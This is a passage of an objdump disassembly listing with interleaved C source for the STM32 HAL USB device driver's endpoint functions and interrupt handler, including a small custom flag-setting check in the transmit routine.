 8002468:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 800246c:	2b01      	cmp	r3, #1
 800246e:	d101      	bne.n	8002474 <HAL_PCD_EP_Close+0x6a>
 8002470:	2302      	movs	r3, #2
 8002472:	e00e      	b.n	8002492 <HAL_PCD_EP_Close+0x88>
 8002474:	687b      	ldr	r3, [r7, #4]
 8002476:	2201      	movs	r2, #1
 8002478:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_DeactivateEndpoint(hpcd->Instance, ep);
 800247c:	687b      	ldr	r3, [r7, #4]
 800247e:	681b      	ldr	r3, [r3, #0]
 8002480:	68f9      	ldr	r1, [r7, #12]
 8002482:	4618      	mov	r0, r3
 8002484:	f004 fa08 	bl	8006898 <USB_DeactivateEndpoint>
  __HAL_UNLOCK(hpcd);
 8002488:	687b      	ldr	r3, [r7, #4]
 800248a:	2200      	movs	r2, #0
 800248c:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  return HAL_OK;
 8002490:	2300      	movs	r3, #0
}
 8002492:	4618      	mov	r0, r3
 8002494:	3710      	adds	r7, #16
 8002496:	46bd      	mov	sp, r7
 8002498:	bd80      	pop	{r7, pc}

0800249a <HAL_PCD_EP_Receive>:
  * @param  pBuf pointer to the reception buffer
  * @param  len amount of data to be received
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Receive(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 800249a:	b580      	push	{r7, lr}
 800249c:	b086      	sub	sp, #24
 800249e:	af00      	add	r7, sp, #0
 80024a0:	60f8      	str	r0, [r7, #12]
 80024a2:	607a      	str	r2, [r7, #4]
 80024a4:	603b      	str	r3, [r7, #0]
 80024a6:	460b      	mov	r3, r1
 80024a8:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80024aa:	7afb      	ldrb	r3, [r7, #11]
 80024ac:	f003 0207 	and.w	r2, r3, #7
 80024b0:	4613      	mov	r3, r2
 80024b2:	009b      	lsls	r3, r3, #2
 80024b4:	4413      	add	r3, r2
 80024b6:	00db      	lsls	r3, r3, #3
 80024b8:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80024bc:	68fa      	ldr	r2, [r7, #12]
 80024be:	4413      	add	r3, r2
 80024c0:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 80024c2:	697b      	ldr	r3, [r7, #20]
 80024c4:	687a      	ldr	r2, [r7, #4]
 80024c6:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 80024c8:	697b      	ldr	r3, [r7, #20]
 80024ca:	683a      	ldr	r2, [r7, #0]
 80024cc:	619a      	str	r2, [r3, #24]
  ep->xfer_count = 0U;
 80024ce:	697b      	ldr	r3, [r7, #20]
 80024d0:	2200      	movs	r2, #0
 80024d2:	61da      	str	r2, [r3, #28]
  ep->is_in = 0U;
 80024d4:	697b      	ldr	r3, [r7, #20]
 80024d6:	2200      	movs	r2, #0
 80024d8:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 80024da:	7afb      	ldrb	r3, [r7, #11]
 80024dc:	f003 0307 	and.w	r3, r3, #7
 80024e0:	b2da      	uxtb	r2, r3
 80024e2:	697b      	ldr	r3, [r7, #20]
 80024e4:	701a      	strb	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 80024e6:	68fb      	ldr	r3, [r7, #12]
 80024e8:	681b      	ldr	r3, [r3, #0]
 80024ea:	6979      	ldr	r1, [r7, #20]
 80024ec:	4618      	mov	r0, r3
 80024ee:	f004 fbc0 	bl	8006c72 <USB_EPStartXfer>

  return HAL_OK;
 80024f2:	2300      	movs	r3, #0
}
 80024f4:	4618      	mov	r0, r3
 80024f6:	3718      	adds	r7, #24
 80024f8:	46bd      	mov	sp, r7
 80024fa:	bd80      	pop	{r7, pc}

080024fc <HAL_PCD_EP_GetRxCount>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval Data Size
  */
uint32_t HAL_PCD_EP_GetRxCount(PCD_HandleTypeDef const *hpcd, uint8_t ep_addr)
{
 80024fc:	b480      	push	{r7}
 80024fe:	b083      	sub	sp, #12
 8002500:	af00      	add	r7, sp, #0
 8002502:	6078      	str	r0, [r7, #4]
 8002504:	460b      	mov	r3, r1
 8002506:	70fb      	strb	r3, [r7, #3]
  return hpcd->OUT_ep[ep_addr & EP_ADDR_MSK].xfer_count;
 8002508:	78fb      	ldrb	r3, [r7, #3]
 800250a:	f003 0207 	and.w	r2, r3, #7
 800250e:	6879      	ldr	r1, [r7, #4]
 8002510:	4613      	mov	r3, r2
 8002512:	009b      	lsls	r3, r3, #2
 8002514:	4413      	add	r3, r2
 8002516:	00db      	lsls	r3, r3, #3
 8002518:	440b      	add	r3, r1
 800251a:	f503 73c2 	add.w	r3, r3, #388	; 0x184
 800251e:	681b      	ldr	r3, [r3, #0]
}
 8002520:	4618      	mov	r0, r3
 8002522:	370c      	adds	r7, #12
 8002524:	46bd      	mov	sp, r7
 8002526:	f85d 7b04 	ldr.w	r7, [sp], #4
 800252a:	4770      	bx	lr

0800252c <HAL_PCD_EP_Transmit>:
  * @param  pBuf pointer to the transmission buffer
  * @param  len amount of data to be sent
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Transmit(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)
{
 800252c:	b580      	push	{r7, lr}
 800252e:	b086      	sub	sp, #24
 8002530:	af00      	add	r7, sp, #0
 8002532:	60f8      	str	r0, [r7, #12]
 8002534:	607a      	str	r2, [r7, #4]
 8002536:	603b      	str	r3, [r7, #0]
 8002538:	460b      	mov	r3, r1
 800253a:	72fb      	strb	r3, [r7, #11]
  PCD_EPTypeDef *ep;

  ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 800253c:	7afb      	ldrb	r3, [r7, #11]
 800253e:	f003 0307 	and.w	r3, r3, #7
 8002542:	1c5a      	adds	r2, r3, #1
 8002544:	4613      	mov	r3, r2
 8002546:	009b      	lsls	r3, r3, #2
 8002548:	4413      	add	r3, r2
 800254a:	00db      	lsls	r3, r3, #3
 800254c:	68fa      	ldr	r2, [r7, #12]
 800254e:	4413      	add	r3, r2
 8002550:	617b      	str	r3, [r7, #20]

  /*setup and start the Xfer */
  ep->xfer_buff = pBuf;
 8002552:	697b      	ldr	r3, [r7, #20]
 8002554:	687a      	ldr	r2, [r7, #4]
 8002556:	615a      	str	r2, [r3, #20]
  ep->xfer_len = len;
 8002558:	697b      	ldr	r3, [r7, #20]
 800255a:	683a      	ldr	r2, [r7, #0]
 800255c:	619a      	str	r2, [r3, #24]
#if defined (USB)
  ep->xfer_fill_db = 1U;
 800255e:	697b      	ldr	r3, [r7, #20]
 8002560:	2201      	movs	r2, #1
 8002562:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
  ep->xfer_len_db = len;
 8002566:	697b      	ldr	r3, [r7, #20]
 8002568:	683a      	ldr	r2, [r7, #0]
 800256a:	621a      	str	r2, [r3, #32]
#endif /* defined (USB) */
  ep->xfer_count = 0U;
 800256c:	697b      	ldr	r3, [r7, #20]
 800256e:	2200      	movs	r2, #0
 8002570:	61da      	str	r2, [r3, #28]
  ep->is_in = 1U;
 8002572:	697b      	ldr	r3, [r7, #20]
 8002574:	2201      	movs	r2, #1
 8002576:	705a      	strb	r2, [r3, #1]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002578:	7afb      	ldrb	r3, [r7, #11]
 800257a:	f003 0307 	and.w	r3, r3, #7
 800257e:	b2da      	uxtb	r2, r3
 8002580:	697b      	ldr	r3, [r7, #20]
 8002582:	701a      	strb	r2, [r3, #0]

  //Determine whether to generate an interrupt:
  if((recv_buffer[0]&0x02) != 0x02)
 8002584:	4b0e      	ldr	r3, [pc, #56]	; (80025c0 <HAL_PCD_EP_Transmit+0x94>)
 8002586:	781b      	ldrb	r3, [r3, #0]
 8002588:	f003 0302 	and.w	r3, r3, #2
 800258c:	2b00      	cmp	r3, #0
 800258e:	d102      	bne.n	8002596 <HAL_PCD_EP_Transmit+0x6a>
	  InterruptFlag = 1;
 8002590:	4b0c      	ldr	r3, [pc, #48]	; (80025c4 <HAL_PCD_EP_Transmit+0x98>)
 8002592:	2201      	movs	r2, #1
 8002594:	601a      	str	r2, [r3, #0]

  (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002596:	68fb      	ldr	r3, [r7, #12]
 8002598:	681b      	ldr	r3, [r3, #0]
 800259a:	6979      	ldr	r1, [r7, #20]
 800259c:	4618      	mov	r0, r3
 800259e:	f004 fb68 	bl	8006c72 <USB_EPStartXfer>

  //Output test to choose whether to RollBack:
  if((recv_buffer[0]&0x02) != 0x02)
 80025a2:	4b07      	ldr	r3, [pc, #28]	; (80025c0 <HAL_PCD_EP_Transmit+0x94>)
 80025a4:	781b      	ldrb	r3, [r3, #0]
 80025a6:	f003 0302 	and.w	r3, r3, #2
 80025aa:	2b00      	cmp	r3, #0
 80025ac:	d102      	bne.n	80025b4 <HAL_PCD_EP_Transmit+0x88>
	  NeedRollBack = 1;
 80025ae:	4b06      	ldr	r3, [pc, #24]	; (80025c8 <HAL_PCD_EP_Transmit+0x9c>)
 80025b0:	2201      	movs	r2, #1
 80025b2:	601a      	str	r2, [r3, #0]
  return HAL_OK;
 80025b4:	2300      	movs	r3, #0
}
 80025b6:	4618      	mov	r0, r3
 80025b8:	3718      	adds	r7, #24
 80025ba:	46bd      	mov	sp, r7
 80025bc:	bd80      	pop	{r7, pc}
 80025be:	bf00      	nop
 80025c0:	2000026c 	.word	0x2000026c
 80025c4:	20000270 	.word	0x20000270
 80025c8:	2000027c 	.word	0x2000027c

080025cc <HAL_PCD_EP_SetStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_SetStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80025cc:	b580      	push	{r7, lr}
 80025ce:	b084      	sub	sp, #16
 80025d0:	af00      	add	r7, sp, #0
 80025d2:	6078      	str	r0, [r7, #4]
 80025d4:	460b      	mov	r3, r1
 80025d6:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & EP_ADDR_MSK) > hpcd->Init.dev_endpoints)
 80025d8:	78fb      	ldrb	r3, [r7, #3]
 80025da:	f003 0207 	and.w	r2, r3, #7
 80025de:	687b      	ldr	r3, [r7, #4]
 80025e0:	685b      	ldr	r3, [r3, #4]
 80025e2:	429a      	cmp	r2, r3
 80025e4:	d901      	bls.n	80025ea <HAL_PCD_EP_SetStall+0x1e>
  {
    return HAL_ERROR;
 80025e6:	2301      	movs	r3, #1
 80025e8:	e04c      	b.n	8002684 <HAL_PCD_EP_SetStall+0xb8>
  }

  if ((0x80U & ep_addr) == 0x80U)
 80025ea:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80025ee:	2b00      	cmp	r3, #0
 80025f0:	da0e      	bge.n	8002610 <HAL_PCD_EP_SetStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80025f2:	78fb      	ldrb	r3, [r7, #3]
 80025f4:	f003 0307 	and.w	r3, r3, #7
 80025f8:	1c5a      	adds	r2, r3, #1
 80025fa:	4613      	mov	r3, r2
 80025fc:	009b      	lsls	r3, r3, #2
 80025fe:	4413      	add	r3, r2
 8002600:	00db      	lsls	r3, r3, #3
 8002602:	687a      	ldr	r2, [r7, #4]
 8002604:	4413      	add	r3, r2
 8002606:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 8002608:	68fb      	ldr	r3, [r7, #12]
 800260a:	2201      	movs	r2, #1
 800260c:	705a      	strb	r2, [r3, #1]
 800260e:	e00c      	b.n	800262a <HAL_PCD_EP_SetStall+0x5e>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 8002610:	78fa      	ldrb	r2, [r7, #3]
 8002612:	4613      	mov	r3, r2
 8002614:	009b      	lsls	r3, r3, #2
 8002616:	4413      	add	r3, r2
 8002618:	00db      	lsls	r3, r3, #3
 800261a:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800261e:	687a      	ldr	r2, [r7, #4]
 8002620:	4413      	add	r3, r2
 8002622:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 8002624:	68fb      	ldr	r3, [r7, #12]
 8002626:	2200      	movs	r2, #0
 8002628:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 1U;
 800262a:	68fb      	ldr	r3, [r7, #12]
 800262c:	2201      	movs	r2, #1
 800262e:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 8002630:	78fb      	ldrb	r3, [r7, #3]
 8002632:	f003 0307 	and.w	r3, r3, #7
 8002636:	b2da      	uxtb	r2, r3
 8002638:	68fb      	ldr	r3, [r7, #12]
 800263a:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 800263c:	687b      	ldr	r3, [r7, #4]
 800263e:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002642:	2b01      	cmp	r3, #1
 8002644:	d101      	bne.n	800264a <HAL_PCD_EP_SetStall+0x7e>
 8002646:	2302      	movs	r3, #2
 8002648:	e01c      	b.n	8002684 <HAL_PCD_EP_SetStall+0xb8>
 800264a:	687b      	ldr	r3, [r7, #4]
 800264c:	2201      	movs	r2, #1
 800264e:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  (void)USB_EPSetStall(hpcd->Instance, ep);
 8002652:	687b      	ldr	r3, [r7, #4]
 8002654:	681b      	ldr	r3, [r3, #0]
 8002656:	68f9      	ldr	r1, [r7, #12]
 8002658:	4618      	mov	r0, r3
 800265a:	f005 febb 	bl	80083d4 <USB_EPSetStall>

  if ((ep_addr & EP_ADDR_MSK) == 0U)
 800265e:	78fb      	ldrb	r3, [r7, #3]
 8002660:	f003 0307 	and.w	r3, r3, #7
 8002664:	2b00      	cmp	r3, #0
 8002666:	d108      	bne.n	800267a <HAL_PCD_EP_SetStall+0xae>
  {
    (void)USB_EP0_OutStart(hpcd->Instance, (uint8_t *)hpcd->Setup);
 8002668:	687b      	ldr	r3, [r7, #4]
 800266a:	681a      	ldr	r2, [r3, #0]
 800266c:	687b      	ldr	r3, [r7, #4]
 800266e:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 8002672:	4619      	mov	r1, r3
 8002674:	4610      	mov	r0, r2
 8002676:	f005 fffc 	bl	8008672 <USB_EP0_OutStart>
  }

  __HAL_UNLOCK(hpcd);
 800267a:	687b      	ldr	r3, [r7, #4]
 800267c:	2200      	movs	r2, #0
 800267e:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002682:	2300      	movs	r3, #0
}
 8002684:	4618      	mov	r0, r3
 8002686:	3710      	adds	r7, #16
 8002688:	46bd      	mov	sp, r7
 800268a:	bd80      	pop	{r7, pc}

0800268c <HAL_PCD_EP_ClrStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_ClrStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 800268c:	b580      	push	{r7, lr}
 800268e:	b084      	sub	sp, #16
 8002690:	af00      	add	r7, sp, #0
 8002692:	6078      	str	r0, [r7, #4]
 8002694:	460b      	mov	r3, r1
 8002696:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & 0x0FU) > hpcd->Init.dev_endpoints)
 8002698:	78fb      	ldrb	r3, [r7, #3]
 800269a:	f003 020f 	and.w	r2, r3, #15
 800269e:	687b      	ldr	r3, [r7, #4]
 80026a0:	685b      	ldr	r3, [r3, #4]
 80026a2:	429a      	cmp	r2, r3
 80026a4:	d901      	bls.n	80026aa <HAL_PCD_EP_ClrStall+0x1e>
  {
    return HAL_ERROR;
 80026a6:	2301      	movs	r3, #1
 80026a8:	e040      	b.n	800272c <HAL_PCD_EP_ClrStall+0xa0>
  }

  if ((0x80U & ep_addr) == 0x80U)
 80026aa:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80026ae:	2b00      	cmp	r3, #0
 80026b0:	da0e      	bge.n	80026d0 <HAL_PCD_EP_ClrStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80026b2:	78fb      	ldrb	r3, [r7, #3]
 80026b4:	f003 0307 	and.w	r3, r3, #7
 80026b8:	1c5a      	adds	r2, r3, #1
 80026ba:	4613      	mov	r3, r2
 80026bc:	009b      	lsls	r3, r3, #2
 80026be:	4413      	add	r3, r2
 80026c0:	00db      	lsls	r3, r3, #3
 80026c2:	687a      	ldr	r2, [r7, #4]
 80026c4:	4413      	add	r3, r2
 80026c6:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 80026c8:	68fb      	ldr	r3, [r7, #12]
 80026ca:	2201      	movs	r2, #1
 80026cc:	705a      	strb	r2, [r3, #1]
 80026ce:	e00e      	b.n	80026ee <HAL_PCD_EP_ClrStall+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 80026d0:	78fb      	ldrb	r3, [r7, #3]
 80026d2:	f003 0207 	and.w	r2, r3, #7
 80026d6:	4613      	mov	r3, r2
 80026d8:	009b      	lsls	r3, r3, #2
 80026da:	4413      	add	r3, r2
 80026dc:	00db      	lsls	r3, r3, #3
 80026de:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 80026e2:	687a      	ldr	r2, [r7, #4]
 80026e4:	4413      	add	r3, r2
 80026e6:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 80026e8:	68fb      	ldr	r3, [r7, #12]
 80026ea:	2200      	movs	r2, #0
 80026ec:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 0U;
 80026ee:	68fb      	ldr	r3, [r7, #12]
 80026f0:	2200      	movs	r2, #0
 80026f2:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 80026f4:	78fb      	ldrb	r3, [r7, #3]
 80026f6:	f003 0307 	and.w	r3, r3, #7
 80026fa:	b2da      	uxtb	r2, r3
 80026fc:	68fb      	ldr	r3, [r7, #12]
 80026fe:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 8002700:	687b      	ldr	r3, [r7, #4]
 8002702:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002706:	2b01      	cmp	r3, #1
 8002708:	d101      	bne.n	800270e <HAL_PCD_EP_ClrStall+0x82>
 800270a:	2302      	movs	r3, #2
 800270c:	e00e      	b.n	800272c <HAL_PCD_EP_ClrStall+0xa0>
 800270e:	687b      	ldr	r3, [r7, #4]
 8002710:	2201      	movs	r2, #1
 8002712:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_EPClearStall(hpcd->Instance, ep);
 8002716:	687b      	ldr	r3, [r7, #4]
 8002718:	681b      	ldr	r3, [r3, #0]
 800271a:	68f9      	ldr	r1, [r7, #12]
 800271c:	4618      	mov	r0, r3
 800271e:	f005 feaa 	bl	8008476 <USB_EPClearStall>
  __HAL_UNLOCK(hpcd);
 8002722:	687b      	ldr	r3, [r7, #4]
 8002724:	2200      	movs	r2, #0
 8002726:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 800272a:	2300      	movs	r3, #0
}
 800272c:	4618      	mov	r0, r3
 800272e:	3710      	adds	r7, #16
 8002730:	46bd      	mov	sp, r7
 8002732:	bd80      	pop	{r7, pc}

08002734 <HAL_PCD_EP_Flush>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Flush(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002734:	b580      	push	{r7, lr}
 8002736:	b082      	sub	sp, #8
 8002738:	af00      	add	r7, sp, #0
 800273a:	6078      	str	r0, [r7, #4]
 800273c:	460b      	mov	r3, r1
 800273e:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 8002740:	687b      	ldr	r3, [r7, #4]
 8002742:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 8002746:	2b01      	cmp	r3, #1
 8002748:	d101      	bne.n	800274e <HAL_PCD_EP_Flush+0x1a>
 800274a:	2302      	movs	r3, #2
 800274c:	e01b      	b.n	8002786 <HAL_PCD_EP_Flush+0x52>
 800274e:	687b      	ldr	r3, [r7, #4]
 8002750:	2201      	movs	r2, #1
 8002752:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  if ((ep_addr & 0x80U) == 0x80U)
 8002756:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800275a:	2b00      	cmp	r3, #0
 800275c:	da09      	bge.n	8002772 <HAL_PCD_EP_Flush+0x3e>
  {
    (void)USB_FlushTxFifo(hpcd->Instance, (uint32_t)ep_addr & EP_ADDR_MSK);
 800275e:	687b      	ldr	r3, [r7, #4]
 8002760:	681a      	ldr	r2, [r3, #0]
 8002762:	78fb      	ldrb	r3, [r7, #3]
 8002764:	f003 0307 	and.w	r3, r3, #7
 8002768:	4619      	mov	r1, r3
 800276a:	4610      	mov	r0, r2
 800276c:	f003 fcb8 	bl	80060e0 <USB_FlushTxFifo>
 8002770:	e004      	b.n	800277c <HAL_PCD_EP_Flush+0x48>
  }
  else
  {
    (void)USB_FlushRxFifo(hpcd->Instance);
 8002772:	687b      	ldr	r3, [r7, #4]
 8002774:	681b      	ldr	r3, [r3, #0]
 8002776:	4618      	mov	r0, r3
 8002778:	f003 fcbe 	bl	80060f8 <USB_FlushRxFifo>
  }

  __HAL_UNLOCK(hpcd);
 800277c:	687b      	ldr	r3, [r7, #4]
 800277e:	2200      	movs	r2, #0
 8002780:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002784:	2300      	movs	r3, #0
}
 8002786:	4618      	mov	r0, r3
 8002788:	3708      	adds	r7, #8
 800278a:	46bd      	mov	sp, r7
 800278c:	bd80      	pop	{r7, pc}

0800278e <PCD_EP_ISR_Handler>:
  * @brief  This function handles PCD Endpoint interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
static HAL_StatusTypeDef PCD_EP_ISR_Handler(PCD_HandleTypeDef *hpcd)
{
 800278e:	b580      	push	{r7, lr}
 8002790:	b096      	sub	sp, #88	; 0x58
 8002792:	af00      	add	r7, sp, #0
 8002794:	6078      	str	r0, [r7, #4]
#if (USE_USB_DOUBLE_BUFFER != 1U)
  count = 0U;
#endif /* USE_USB_DOUBLE_BUFFER */

  /* stay in loop while pending interrupts */
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002796:	e3b1      	b.n	8002efc <PCD_EP_ISR_Handler+0x76e>
  {
    wIstr = hpcd->Instance->ISTR;
 8002798:	687b      	ldr	r3, [r7, #4]
 800279a:	681b      	ldr	r3, [r3, #0]
 800279c:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 80027a0:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e

    /* extract highest priority endpoint number */
    epindex = (uint8_t)(wIstr & USB_ISTR_EP_ID);
 80027a4:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80027a8:	b2db      	uxtb	r3, r3
 80027aa:	f003 030f 	and.w	r3, r3, #15
 80027ae:	f887 304d 	strb.w	r3, [r7, #77]	; 0x4d

    if (epindex == 0U)
 80027b2:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 80027b6:	2b00      	cmp	r3, #0
 80027b8:	f040 8173 	bne.w	8002aa2 <PCD_EP_ISR_Handler+0x314>
    {
      /* Decode and service control endpoint interrupt */

      /* DIR bit = origin of the interrupt */
      if ((wIstr & USB_ISTR_DIR) == 0U)
 80027bc:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80027c0:	f003 0310 	and.w	r3, r3, #16
 80027c4:	2b00      	cmp	r3, #0
 80027c6:	d150      	bne.n	800286a <PCD_EP_ISR_Handler+0xdc>
      {
        /* DIR = 0 */

        /* DIR = 0 => IN  int */
        /* DIR = 0 implies that (EP_CTR_TX = 1) always */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 80027c8:	687b      	ldr	r3, [r7, #4]
 80027ca:	681b      	ldr	r3, [r3, #0]
 80027cc:	881b      	ldrh	r3, [r3, #0]
 80027ce:	b29b      	uxth	r3, r3
 80027d0:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 80027d4:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80027d8:	81fb      	strh	r3, [r7, #14]
 80027da:	687b      	ldr	r3, [r7, #4]
 80027dc:	681a      	ldr	r2, [r3, #0]
 80027de:	89fb      	ldrh	r3, [r7, #14]
 80027e0:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80027e4:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80027e8:	b29b      	uxth	r3, r3
 80027ea:	8013      	strh	r3, [r2, #0]
        ep = &hpcd->IN_ep[0];
 80027ec:	687b      	ldr	r3, [r7, #4]
 80027ee:	3328      	adds	r3, #40	; 0x28
 80027f0:	657b      	str	r3, [r7, #84]	; 0x54

        ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 80027f2:	687b      	ldr	r3, [r7, #4]
 80027f4:	681b      	ldr	r3, [r3, #0]
 80027f6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80027fa:	b29b      	uxth	r3, r3
 80027fc:	461a      	mov	r2, r3
 80027fe:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002800:	781b      	ldrb	r3, [r3, #0]
 8002802:	00db      	lsls	r3, r3, #3
 8002804:	4413      	add	r3, r2
 8002806:	687a      	ldr	r2, [r7, #4]
 8002808:	6812      	ldr	r2, [r2, #0]
 800280a:	4413      	add	r3, r2
 800280c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002810:	881b      	ldrh	r3, [r3, #0]
 8002812:	f3c3 0209 	ubfx	r2, r3, #0, #10
 8002816:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002818:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += ep->xfer_count;
 800281a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800281c:	695a      	ldr	r2, [r3, #20]
 800281e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002820:	69db      	ldr	r3, [r3, #28]
 8002822:	441a      	add	r2, r3
 8002824:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002826:	615a      	str	r2, [r3, #20]

        /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
        hpcd->DataInStageCallback(hpcd, 0U);
#else
        HAL_PCD_DataInStageCallback(hpcd, 0U);
 8002828:	2100      	movs	r1, #0
 800282a:	6878      	ldr	r0, [r7, #4]
 800282c:	f00a f98f 	bl	800cb4e <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

        if ((hpcd->USB_Address > 0U) && (ep->xfer_len == 0U))
 8002830:	687b      	ldr	r3, [r7, #4]
 8002832:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8002836:	b2db      	uxtb	r3, r3
 8002838:	2b00      	cmp	r3, #0
 800283a:	f000 835f 	beq.w	8002efc <PCD_EP_ISR_Handler+0x76e>
 800283e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002840:	699b      	ldr	r3, [r3, #24]
 8002842:	2b00      	cmp	r3, #0
 8002844:	f040 835a 	bne.w	8002efc <PCD_EP_ISR_Handler+0x76e>
        {
          hpcd->Instance->DADDR = ((uint16_t)hpcd->USB_Address | USB_DADDR_EF);
 8002848:	687b      	ldr	r3, [r7, #4]
 800284a:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 800284e:	b2db      	uxtb	r3, r3
 8002850:	f063 037f 	orn	r3, r3, #127	; 0x7f
 8002854:	b2da      	uxtb	r2, r3
 8002856:	687b      	ldr	r3, [r7, #4]
 8002858:	681b      	ldr	r3, [r3, #0]
 800285a:	b292      	uxth	r2, r2
 800285c:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
          hpcd->USB_Address = 0U;
 8002860:	687b      	ldr	r3, [r7, #4]
 8002862:	2200      	movs	r2, #0
 8002864:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8002868:	e348      	b.n	8002efc <PCD_EP_ISR_Handler+0x76e>
      {
        /* DIR = 1 */

        /* DIR = 1 & CTR_RX => SETUP or OUT int */
        /* DIR = 1 & (CTR_TX | CTR_RX) => 2 int pending */
        ep = &hpcd->OUT_ep[0];
 800286a:	687b      	ldr	r3, [r7, #4]
 800286c:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002870:	657b      	str	r3, [r7, #84]	; 0x54
        wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 8002872:	687b      	ldr	r3, [r7, #4]
 8002874:	681b      	ldr	r3, [r3, #0]
 8002876:	881b      	ldrh	r3, [r3, #0]
 8002878:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

        if ((wEPVal & USB_EP_SETUP) != 0U)
 800287c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
